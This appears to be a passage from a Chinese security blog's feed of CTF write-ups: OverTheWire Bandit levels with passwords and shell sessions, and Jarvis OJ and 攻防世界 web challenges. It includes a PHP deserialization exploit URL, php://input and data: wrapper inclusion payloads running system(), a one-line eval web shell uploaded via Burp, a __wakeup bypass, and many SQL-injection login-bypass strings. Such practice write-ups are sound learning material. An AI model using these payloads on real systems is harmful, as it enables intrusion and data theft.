lsbandit24.shbandit23@bandit:/tmp/crayon$ lsbandit24.shbandit23@bandit:/tmp/crayon$ lsbandit24.shbandit23@bandit:/tmp/crayon$ lsbandit24.sh# 等一会儿就有了bandit23@bandit:/tmp/crayon$ lsbandit24.sh  level24bandit23@bandit:/tmp/crayon$ cat level24 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</code></pre><p>在/tmp/文件夹中创建一个目录。创建一个shell脚本将/etc/bandit_pass /bandit24复制到我们的/tmp/文件夹。将shell脚本复制到/var/spool/bandit24/。给shell脚本和/tmp/文件夹适当的权限。/usr/bin/cronjob_bandit24.sh这个shell的作用就是执行 /var/spool/bandit24 的脚本，60s 如果还没之行结束会强制kill掉，然后删除。所以我们写了一个把 /etc/bandit_pass/bandit24/ 输出到 /tmp/crayon的脚本到这个目录下，然后付了个权限。</p><p>密码：UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>overthewire解题（一）</title>
    <link href="/2020/01/12/overthewire%E8%A7%A3%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2020/01/12/overthewire%E8%A7%A3%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h1><p>直接ls<br>cat readme</p><h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><p>pwd</p><p>cat ./.-</p><h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><p>关于转义字符可以用反斜杠进行转义。也可以用tab键。</p><p><img src="/img/6.png" srcset="/img/loading.gif" alt=""></p><h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><p><img src="/img/7.png" srcset="/img/loading.gif" alt=""><br>这里将文件进行了隐藏<br>直接用find找到了隐藏文件。<br>密码</p><blockquote><blockquote><blockquote><p>pIwrPrtPN36QITSp3EQaw936yaFoFgAB</p></blockquote></blockquote></blockquote><h1 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h1><p><img src="/img/8.png" srcset="/img/loading.gif" alt=""><br>这题很简单，直接一个一个文件读取就行了<br>密码：</p><blockquote><blockquote><blockquote><p>koReBOKuIDDepwhWk7jZC0RTdopnAYKh</p></blockquote></blockquote></blockquote><h1 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h1><p><img src="/img/9.png" srcset="/img/loading.gif" alt=""><br>按照笨方法应该已经不能用了<br><img src="/img/10.png" srcset="/img/loading.gif" alt=""><br>“ls -l”除文件名称外，亦将文件型态、权限、拥有者、文件大小等资讯详细列出，发现有很多文件夹，”find . -type f -size 1033c”，”.”查找当前目录以及子目录，-type f指定文件类型为普通文件，-size 1033c指定文件大小为 1033 bytes.<br>密码：</p><blockquote><blockquote><blockquote><p>DXjZPULLxYr17uwoI01bNLQbtFemEgo7</p></blockquote></blockquote></blockquote><h1 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h1><p>grep（global search regular expression(RE) and print out the line，全面搜索正则表达式并把行打印出来）是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来。<br><img src="/img/11.png" srcset="/img/loading.gif" alt=""><br>“/“ linux 根目录,从最顶层开始查找，”2&gt;/dev/null”中”2”表示错误输出，”&gt;”是重定向符号表示把信息送到哪里，”/dev/null”是Linux黑洞.</p><p>密码：HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs</p><h1 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h1><p>The password for the next level is stored in the file data.txt next to the word millionth</p><p>Commands you may need to solve this level<br>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd</p><p>sort命令是在Linux里非常有用，它将文件进行排序，并将排序结果标准输出。sort命令既可以从特定的文件，也可以从stdin中获取输入。以从特定的文件，也可以从stdin中获取输入。</p><p>Linux uniq 命令用于检查及删除文本文件中重复出现的行列，一般与 sort 命令结合使用。</p><p>uniq 可检查文本文件中重复出现的行列。</p><p>strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。 strings命令对识别随机对象文件很有用。</p><p><img src="/img/12.png" srcset="/img/loading.gif" alt=""></p><p>密码：</p><blockquote><blockquote><blockquote><p>cvX2JJa4CFALtqS87jk27qwqGhBM9plV</p></blockquote></blockquote></blockquote><h1 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h1><p>The password for the next level is stored in the file data.txt and is the only line of text that occurs only once</p><p>sort命令用于将文本文件内容加以排序，可针对文本文件的内容，以行为单位来排序。”uniq -u”是上下相邻两行对比得到是否为单一行。</p><p>密码：UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR</p><h1 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h1><p>过程：</p><pre><code>bandit9@bandit:~$ lsdata.txtbandit9@bandit:~$ strings data.txt | grep ============ theP`========== passwordL========== isA========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLkstrings是在文件中查找可打印字符串并输出长度为4个或更多的字符串，遇到换行或空字符结束，用 grep 命令筛选 含有”==”的字符串。</code></pre><p>密码：</p><blockquote><blockquote><blockquote><p>KLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk</p></blockquote></blockquote></blockquote><h1 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h1><p><img src="/img/13.png" srcset="/img/loading.gif" alt=""><br>密码：</p><blockquote><blockquote><blockquote><p>IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR</p></blockquote></blockquote></blockquote><h1 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h1><p>下一级别的密码存储在文件data.txt中，其中所有小写（az）和大写（AZ）字母都已旋转了13个位置<br><img src="/img/15.png" srcset="/img/loading.gif" alt=""><br>密码：</p><blockquote><blockquote><blockquote><p>5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu</p></blockquote></blockquote></blockquote><h1 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h1><p>xxd 命令用于使用二进制或十六进制格式显示文件内容，可以将指定文件或标准输入以十六进制转储,也可以把十六进制转储转换成原来的二进制形式。<br>过程：</p><pre><code>bandit12@bandit:~$ lsdata.txtbandit12@bandit:~$ mkdir /tmp/Crayon123; cp data.txt /tmp/Crayon123/data_1; cd /tmp/Crayon123bandit12@bandit:/tmp/Crayon123$ cat data_1 ;file data_1 00000000: 1f8b 0808 ecf2 445a 0203 6461 7461 322e  ......DZ..data2.00000010: 6269 6e00 0149 02b6 fd42 5a68 3931 4159  bin..I...BZh91AY00000020: 2653 5930 3e1b 4000 0014 ffff dde3 2b6d  &amp;SY0&gt;.@.......+m00000030: afff dd1e dfd7 ffbf bdfb 3f67 bfff ffff  ..........?g....00000040: bde5 bfff aff7 bfdb e5ff ffef b001 39b0  ..............9.00000050: 480d 3400 0068 0068 1a00 0000 01a3 4000  H.4..h.h......@.00000060: 0001 a643 4d34 0000 d00d 0698 800d 1934  ...CM4.........400000070: d0c4 d034 1a36 a343 646a 1c9a 3206 9a00  ...4.6.Cdj..2...00000080: 3406 8000 068d 064f 51a3 4000 000f 5000  4......OQ.@...P.00000090: 6868 0034 d308 0da4 6990 1a03 4000 6869  hh.4....i...@.hi000000a0: a0d0 00d3 2341 94d0 0006 8006 8034 1a34  ....#A.......4.4000000b0: 00d0 d000 0310 d068 3400 001e 900d 1a19  .......h4.......000000c0: 0062 68d3 4680 640f 48d0 d320 0068 621a  .bh.F.d.H.. .hb.000000d0: 0543 0116 180c 6232 a7d7 82c8 7bd4 2374  .C....b2....{.#t000000e0: 1de5 e375 b7b9 0b78 2d37 bd61 5cdf 40da  ...u...x-7.a\.@.000000f0: b8e5 3258 213d e4bb ecb2 8d51 84f9 3bd0  ..2X!=.....Q..;.00000100: b1c9 ef2a bcff 45cc 1f1c 0028 1cfe 8784  ...*..E....(....00000110: 78a9 7611 0a81 c4d5 cb26 4b80 7888 c9bc  x.v......&amp;K.x...00000120: 2b3e a351 59ae c1fd 36c8 286e d6c3 bb2b  +&gt;.QY...6.(n...+00000130: b280 d19b 70b3 190a 0204 4603 9f79 e2b8  ....p.....F..y..00000140: cf1b 8330 fcad 3780 86c2 5c3d 5bc9 4631  ...0..7...\=[.F100000150: 3718 5e2e a88c 34e6 8461 35ad c14f 6fd4  7.^...4..a5..Oo.00000160: 31dd a5cc 5223 545e e01d ff23 cde3 22cc  1...R#T^...#..&quot;.00000170: 22fa a62b e27a dfa5 d4f0 c326 28ef a4b3  &quot;..+.z.....&amp;(...00000180: adc5 149c 1c27 dbc4 97b9 6342 487e bfe3  .....&#39;....cBH~..00000190: 02ee d63e 3379 8ebc d559 c670 7987 da1d  ...&gt;3y...Y.py...000001a0: 4c4b 5ec4 9965 075b 9d0b 08ee df17 d07c  LK^..e.[.......|000001b0: ea9a 5fbf 43e7 d405 5239 1437 0c8a 34cd  .._.C...R9.7..4.000001c0: be6f a949 b061 68e8 6ba5 c9ba 4112 0819  .o.I.ah.k...A...000001d0: 7cb9 a3c8 bff1 0895 1819 8f80 407e dc32  |...........@~.2000001e0: 9269 ca68 3f58 bb30 cd9b fcd6 0006 1224  .i.h?X.0.......$000001f0: 177b fe66 c676 01f0 a5bc 9131 6746 cc85  .{.f.v.....1gF..00000200: 1a39 e46f 6b9a 7bd4 694b e999 c300 b57e  .9.ok.{.iK.....~00000210: 9b0a 1229 fac1 cc0c 24fb a905 a06a b8cf  ...)....$....j..00000220: cb56 2a73 6016 6950 8208 5785 af54 0d42  .V*s`.iP..W..T.B00000230: 754e 5a48 8835 2b47 aa9b c45e 4ca8 a7a0  uNZH.5+G...^L...00000240: 61dd e070 7717 9346 5f14 d808 8263 7746  a..pw..F_....cwF00000250: 5100 3af8 fa20 ff8b b922 9c28 4818 1f0d  Q.:.. ...&quot;.(H...00000260: a000 e793 1e61 4902 0000                 .....aI...data_1: ASCII textbandit12@bandit:/tmp/Crayon123$ xxd -r data_1 &gt; data_2 ; file data_2data_2: gzip compressed data, was &quot;data2.bin&quot;, last modified: Thu Dec 28 13:34:36 2017, max compression, from Unixbandit12@bandit:/tmp/Crayon123$ mv data_2 data_3.gz ;bandit12@bandit:/tmp/Crayon123$ gzip -d data_3.gz ;bandit12@bandit:/tmp/Crayon123$ lsdata_1  data_3bandit12@bandit:/tmp/Crayon123$ file data_3data_3: bzip2 compressed data, block size = 900kbandit12@bandit:/tmp/Crayon123$ mv data_3 data_4.bz2 ; bzip2 -d data_4.bz2 ;bandit12@bandit:/tmp/Crayon123$ lsdata_1  data_4bandit12@bandit:/tmp/Crayon123$ file data_4data_4: gzip compressed data, was &quot;data4.bin&quot;, last modified: Thu Dec 28 13:34:36 2017, max compression, from Unixbandit12@bandit:/tmp/Crayon123$ mv data_4 data_5.gz ; gzip -d data_5.gz  bandit12@bandit:/tmp/Crayon123$ lsdata_1  data_5bandit12@bandit:/tmp/Crayon123$ file data_5data_5: POSIX tar archive (GNU)bandit12@bandit:/tmp/Crayon123$ mv data_5 data_6.tar ; tar -xvf data_6.tardata5.binbandit12@bandit:/tmp/Crayon123$ lsdata5.bin  data_1  data_6.tarbandit12@bandit:/tmp/Crayon123$ file data5.bin data5.bin: POSIX tar archive (GNU)bandit12@bandit:/tmp/Crayon123$ mv data5.bin data_7.tar; tar -xvf data_7.tardata6.binbandit12@bandit:/tmp/Crayon123$ file data6.bin data6.bin: bzip2 compressed data, block size = 900kbandit12@bandit:/tmp/Crayon123$ mv data6.bin data_8.bz2 ; bzip2 -d data_8.bz2bandit12@bandit:/tmp/Crayon123$ lsdata_1  data_6.tar  data_7.tar  data_8bandit12@bandit:/tmp/Crayon123$ file data_8data_8: POSIX tar archive (GNU)bandit12@bandit:/tmp/Crayon123$ mv data_8 data_9.tar ; tar -xvf data_9.tardata8.binbandit12@bandit:/tmp/Crayon123$ lsdata8.bin  data_1  data_6.tar  data_7.tar  data_9.tarbandit12@bandit:/tmp/Crayon123$ file data8.bin data8.bin: gzip compressed data, was &quot;data9.bin&quot;, last modified: Thu Dec 28 13:34:36 2017, max compression, from Unixbandit12@bandit:/tmp/Crayon123$ mv data8.bin data_10.gz ; gzip -d data_10.gzbandit12@bandit:/tmp/Crayon123$ lsdata_1  data_10  data_6.tar  data_7.tar  data_9.tarbandit12@bandit:/tmp/Crayon123$ file data_10data_10: ASCII textbandit12@bandit:/tmp/Crayon123$ cat data_10The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL其实这一题并不是很难，一步一步看解题过程就明白怎么回事了，文件最开始是16进制，用” xxd -r”将16进制文件转换为二进制文件，然后每一步都查看一次文件类型，并重命名为相应的文件类型，主要运用”bzip2 -d”,”gzip -d”,”tar -xvf”以及`这些解压方法。</code></pre><p>密码：</p><blockquote><blockquote><blockquote><p>yCRiBWFYkneahHwxCv3wb2a1ORpYL</p></blockquote></blockquote></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Jarvis OJ 神盾局的秘密</title>
    <link href="/2020/01/11/Jarvis-OJ-%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86/"/>
    <url>/2020/01/11/Jarvis-OJ-%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<p>神盾局的秘密<br>题目链接：<a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/</a><br>题目提示:</p><p>这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？</p><p>访问链接之后，得到就是一张图片，通过burp抓包，发现在中途访问了网址<a href="http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocA==，看链接是一个文件读取，文件名是使用base64加密了。" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocA==，看链接是一个文件读取，文件名是使用base64加密了。</a><br>读取showimg.php的内容:</p><pre><code>&lt;?php    $f = $_GET[&#39;img&#39;];    if (!empty($f)) {        $f = base64_decode($f);        if (stripos($f,&#39;..&#39;)===FALSE &amp;&amp; stripos($f,&#39;/&#39;)===FALSE &amp;&amp; stripos($f,&#39;\\&#39;)===FALSE        &amp;&amp; stripos($f,&#39;pctf&#39;)===FALSE) {            readfile($f);        } else {            echo &quot;File not found!&quot;;        }    }?&gt;</code></pre><p>普通的内容，没有与Flag相关的信息。<br>尝试读取index.php的信息:</p><pre><code>&lt;?php     require_once(&#39;shield.php&#39;);    $x = new Shield();    isset($_GET[&#39;class&#39;]) &amp;&amp; $g = $_GET[&#39;class&#39;];    if (!empty($g)) {        $x = unserialize($g);    }    echo $x-&gt;readfile();?&gt;</code></pre><p>index.php也没有出现与Flag相关的信息，但是index.php读取的class参数的值，并且没有对参数进行过滤。<br>读取shield.php信息：</p><pre><code>&lt;?php    //flag is in pctf.php    class Shield {        public $file;        function __construct($filename = &#39;&#39;) {            $this -&gt; file = $filename;        }      function readfile() {          if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE            &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) {              return @file_get_contents($this-&gt;file);          }      }  }</code></pre><p>  ?&gt;<br>说明了Flag在pctf.php中，结合index.php的源代码。得到最后的Flag信息。但是我们需要一个Shield类的实例$X,实例$x中的file属性为pctf.php。但是目前的代码无法做到这一点。但是想了很久都没有想到，最后请教了40huo。最后知道需要本地搭建环境，对示例进行序列话。<br>index.php</p><pre><code>&lt;?php    require_once(&#39;shield.php&#39;);    $x = new Shield();    echo serialize($x);?&gt;</code></pre><p>  shield.php</p><pre><code>&lt;?php    //flag is in pctf.php    class Shield {        public $file;        function __construct($filename = &#39;pctf.php&#39;) {            $this -&gt; file = $filename;        }        function readfile() {            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE              &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) {                return @file_get_contents($this-&gt;file);            }        }    }?&gt;</code></pre><p>最关键的代码就是,在进行初始化的时候，将$filename赋值为pctf.php</p><pre><code>function __construct($filename = &#39;pctf.php&#39;) {    $this -&gt; file = $filename;}</code></pre><p>最后得到的序列话的值是：</p><pre><code>O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>最后访问URL:<a href="http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}</a><br>页面返回:</p><pre><code>&lt;?php     //Ture Flag : PCTF{W3lcome_To_Shi3ld_secret_Ar3a}    //Fake flag:    echo &quot;FLAG: PCTF{I_4m_not_fl4g}&quot;?&gt;</code></pre>]]></content>
    
    
    <categories>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>Jarvis OJ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python模板注入</title>
    <link href="/2020/01/10/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <url>/2020/01/10/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.freebuf.com/column/187845.html" target="_blank" rel="noopener">https://www.freebuf.com/column/187845.html</a></p><p>攻防世界中模板注入例题的wp:<a href="https://blog.csdn.net/qq_40884727/article/details/101605002" target="_blank" rel="noopener">https://blog.csdn.net/qq_40884727/article/details/101605002</a></p><p><a href="https://blog.csdn.net/qq_17204441/article/details/102857726" target="_blank" rel="noopener">https://blog.csdn.net/qq_17204441/article/details/102857726</a></p>]]></content>
    
    
    <categories>
      
      <category>WEB，python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界web进阶区Web_php_include</title>
    <link href="/2019/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/"/>
    <url>/2019/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h1><p><img src="/img/php1.png" srcset="/img/loading.gif" alt=""></p><p>strstr() 函数搜索字符串在另一字符串中的第一次出现。<br>注释：该函数是二进制安全的。<br>注释：该函数对大小写敏感。如需进行不区分大小写的搜索，请使用 stristr() 函数。</p><p>那就利用大小写绕过输入：</p><blockquote><blockquote><p>?page=phP://input</p></blockquote></blockquote><p><img src="/img/php2.png" srcset="/img/loading.gif" alt=""><br>图片里我忘记打成大写了。</p><p><img src="/img/php3.png" srcset="/img/loading.gif" alt=""></p><p>直接访问flag发现一片空白。</p><p><img src="/img/php4.png" srcset="/img/loading.gif" alt=""></p><p>那就继续在burp里用cat命令访问，成功取得flag。</p><p>事后观看其他人的思路还可以用data直接查看：</p><blockquote><blockquote><p>?page=data:text/plain,<?php%20system("cat%20fl4gisisish3r3.php");?></p></blockquote></blockquote><p>或者麻烦一点用菜刀也可以做出来。</p>]]></content>
    
    
    <categories>
      
      <category>攻防世界，web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB，upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界upload1总结</title>
    <link href="/2019/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cupload1%E6%80%BB%E7%BB%93/"/>
    <url>/2019/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cupload1%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="攻防世界web进阶区upload1"><a href="#攻防世界web进阶区upload1" class="headerlink" title="攻防世界web进阶区upload1"></a>攻防世界web进阶区upload1</h1><p>打开题目网站，直接出现了一个上传的界面，试着直接点一个php文件进行上传。发现上传的那个按钮直接变灰，无法点击。于是又点了一个1.jpg文件。</p><blockquote><blockquote><blockquote><?php phpinfo();?></blockquote></blockquote></blockquote><p>然后上传用burp suite进行拦截直接改名为php。发现上传成功。并且页面显示上传文件后的路径，进行访问。<br>果真显示了phpinfo的界面<br><img src="/img/caidao3.png" srcset="/img/loading.gif" alt=""><br>嗯。。。。那就用菜刀进行连接，传一个一句话代码。</p><blockquote><blockquote><blockquote><?php @eval($_POST['caidao']);?></blockquote></blockquote></blockquote><p>然后打开菜刀进行连接。额。。。。失败了。<br>然后进行百度发现我传入菜刀时，忘记修改后缀名，将jpg改成php。</p><p><img src="/img/caidao2.png" srcset="/img/loading.gif" alt=""><br><img src="/img/caidai1.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>攻防世界，web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB，upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>__wakeup漏洞绕过</title>
    <link href="/2019/12/25/wakeup%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87/"/>
    <url>/2019/12/25/wakeup%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h2 id="wakeup-函数用法"><a href="#wakeup-函数用法" class="headerlink" title="__wakeup()函数用法"></a>__wakeup()函数用法</h2><p><strong>wakeup()是用在反序列化操作中。unserialize()会检查存在一个</strong>wakeup()方法。如果存在，则先会调用__wakeup()方法。</p><pre><code>&lt;?phpclass A{function __wakeup(){echo &#39;Hello&#39;;}}$c = new A();$d=unserialize(&#39;O:1:&quot;A&quot;:0:{}&#39;);?&gt;</code></pre><p>最后页面输出了Hello。在反序列化的时候存在__wakeup()函数，所以最后就会输出Hello<br>__wakeup()函数漏洞说明</p><pre><code>&lt;?phpclass Student{public $full_name = &#39;zhangsan&#39;;public $score = 150;public $grades = array();function __wakeup() {echo &quot;__wakeup is invoked&quot;;}}$s = new Student();var_dump(serialize($s));?&gt;</code></pre><p>最后页面上输出的就是Student对象的一个序列化输出，<br>O:7:”Student”:3:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}}。其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。<br><strong>wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过</strong>wakeup的执行。<br>当我们将上述的序列化的字符串中的对象属性修改为5，变为<br>O:7:”Student”:5:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}}。<br>最后执行运行的代码如下：</p><pre><code>class Student{public $full_name = &#39;zhangsan&#39;;public $score = 150;public $grades = array();function __wakeup() {echo &quot;__wakeup is invoked&quot;;}function __destruct() {var_dump($this);}}$s = new Student();$stu = unserialize(&#39;O:7:&quot;Student&quot;:5:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}}&#39;);</code></pre><p>可以看到这样就成功地绕过了__wakeup()函数。</p>]]></content>
    
    
    <categories>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入(一）</title>
    <link href="/2019/12/22/SQL%E6%B3%A8%E5%85%A5(%E4%B8%80)/"/>
    <url>/2019/12/22/SQL%E6%B3%A8%E5%85%A5(%E4%B8%80)/</url>
    
    <content type="html"><![CDATA[<h2 id="万能密码—very-easy"><a href="#万能密码—very-easy" class="headerlink" title="万能密码—very easy"></a>万能密码—very easy</h2><p>题目入口：<a href="http://lab1.xseclab.com/sqli2_3265b4852c13383560327d1c31550b60/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/sqli2_3265b4852c13383560327d1c31550b60/index.php</a> </p><p>题目来源：hacking lab inject 01~</p><p><img src="/img/1.jpg" srcset="/img/loading.gif" alt=""></p><p>源代码有提示：</p><blockquote><p>&lt;!--ps login as admin–&gt;</p></blockquote><p>万能密码登录语句构造： </p><p>select * from admin where username=’admin’and 1=1 #’ and password=’123456′ </p><p>OR </p><p>select * from admin where username=’admin’or 1 #’ and password=’123456′ </p><p>或者不需要admin </p><p>select * from admin where username=’1′or 1 or 1 #’ and password=’123456′ </p><p>还可以用#来注释 </p><p>select * from admin where username=’admin’#’ and password=’123456′</p><h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p>题目入口：<a href="http://redtiger.labs.overthewire.org/level2.php" target="_blank" rel="noopener">http://redtiger.labs.overthewire.org/level2.php</a> </p><p>题目来源：RedTigers Hackit Level 2 Simple login-bypass </p><p>做题密码：4_is_not_random </p><p>构造语句： </p><p>username=1&amp;password=1′or’1′or’1&amp;login=Login</p><p> pass.png</p><h2 id="万能密码–-not-easy"><a href="#万能密码–-not-easy" class="headerlink" title="万能密码– not easy"></a>万能密码– not easy</h2><p>题目入口： <a href="http://ctf5.shiyanbar.com/web/wonderkun/web/index.html" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/wonderkun/web/index.html</a> </p><p>题目来源：实验吧，不要怀疑,我已经过滤了一切,还再逼你注入,哈哈哈哈哈!</p><p>常规方式使用万能密码，发现’没有被过滤，or，–+，#被过滤。</p><p><img src="/img/2.jpg" srcset="/img/loading.gif" alt=""></p><p>假设后台sql查询语句为： </p><p>select * from user where username=’$user’ and password=’$pass’ </p><p>构造payload： </p><p>username=reborn’=’&amp;password=reborn’=’</p><p> <img src="/img/3.jpg" srcset="/img/loading.gif" alt=""></p><pre><code>select * from user where username=’reborn’=” and password=’reborn’=”</code></pre><p>username=’reborn’返回值为0，相当于false，然后0=”的结果为1，相当于true。 </p><p>所以注入语句相当于：</p><pre><code>select * from user where 1 and 1</code></pre><h2 id="万能密码—-little-hard"><a href="#万能密码—-little-hard" class="headerlink" title="万能密码— little hard ?"></a>万能密码— little hard ?</h2><p>题目入口：<a href="http://123.59.52.228:1515/route.php?act=index" target="_blank" rel="noopener">http://123.59.52.228:1515/route.php?act=index</a> </p><p>题目来源：2017年全国大学生信息安全竞赛的web题。</p><p><img src="/img/4.jpg" srcset="/img/loading.gif" alt=""></p><p>提交的时候，返回包有提示这么一个sql语句： </p><pre><code>select count(*) from t_info where username = ’1′ or nickname = ’1′ </code></pre><p>‘ 转义 \ </p><p>\ 转义 \ </p><p>” 转义 \” </p><p>空格被过滤：但’可以转义掉原本的’ </p><pre><code>name=or 1 #’&amp;submit=check select count(*) from t_info where username = ‘or1#\’ or nickname = ‘or1#\’ </code></pre><p>用%09代替空格，%09是制表符的URL编码 </p><pre><code>name=or%091%09#’&amp;submit=check select count(*) from t_info where username = ‘or 1 #\’ or nickname = ‘or 1 #\’good job </code></pre><p>跟随302跳转。</p><h2 id="万能密码—-md5-pass-true"><a href="#万能密码—-md5-pass-true" class="headerlink" title="万能密码— md5($pass,true)"></a>万能密码— md5($pass,true)</h2><p>题目入口：<a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">http://web.jarvisoj.com:32772/</a> </p><p>题目来源：jarvis oj，Login：需要密码才能获得flag哦。</p><p>本题是一个登录页面。</p><p><img src="/img/5.jpg" srcset="/img/loading.gif" alt=""></p><p>通过burp抓包拦截，返回包有提示：</p><p> tishi.png</p><pre><code>Hint: “select * from `admin` where password=’”.md5($pass,true).”‘”</code></pre><ul><li>md5(string,raw)* </li></ul><p>string 必需。规定要计算的字符串。 </p><p>raw 可选。规定十六进制或二进制输出格式： </p><p>•  TRUE – 原始 16 字符二进制格式</p><p>•  FALSE – 默认。32 字符十六进制数如果md5计算后的值经过hex转成字符串后为 ”or’xxx’这样的字符串，则拼接后构成的语句为：</p><pre><code>select * from `admin` where password=”or’xxx’</code></pre><p>下面提供两个payload： </p><p>content: 129581926211651571912466741651878684928 </p><p>hex: 06da5430449f8f6f23dfc1276f722738 </p><p>raw: ?T0D??o#??’or’8.N=?</p><p>content: ffifdyop </p><p>hex: 276f722736c95d99e921722cf9ed621c </p><p>raw: ‘or’6蒥欓!r,b </p><p>类似题目： </p><p>题目入口：<a href="http://lab1.xseclab.com/code1_9f44bab1964d2f959cf509763980e156/" target="_blank" rel="noopener">http://lab1.xseclab.com/code1_9f44bab1964d2f959cf509763980e156/</a> </p><p>题目来源：hacking lab inject 09~ </p><pre><code>看到源代码password=’”.md5($_GET[&#39;pwd&#39;], true)，就知道这道题和题目3的解法是一致的。 http://lab1.xseclab.com/code1_9f44bab1964d2f959cf509763980e156/?userid=1&amp;pwd=ffifdyop</code></pre><h2 id="万能密码—-with-rollup"><a href="#万能密码—-with-rollup" class="headerlink" title="万能密码— with rollup"></a>万能密码— with rollup</h2><p>题目入口： <a href="http://ctf5.shiyanbar.com/web/pcat/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/pcat/index.php</a> </p><p>题目来源：实验吧 </p><p>访问链接是登录页面：</p><p><img src="/img/6.jpg" srcset="/img/loading.gif" alt=""></p><p>查看网页源代码有提示：</p><p><img src="/img/7.jpg" srcset="/img/loading.gif" alt=""></p><p>访问：<a href="http://ctf5.shiyanbar.com/web/pcat/source.txt" 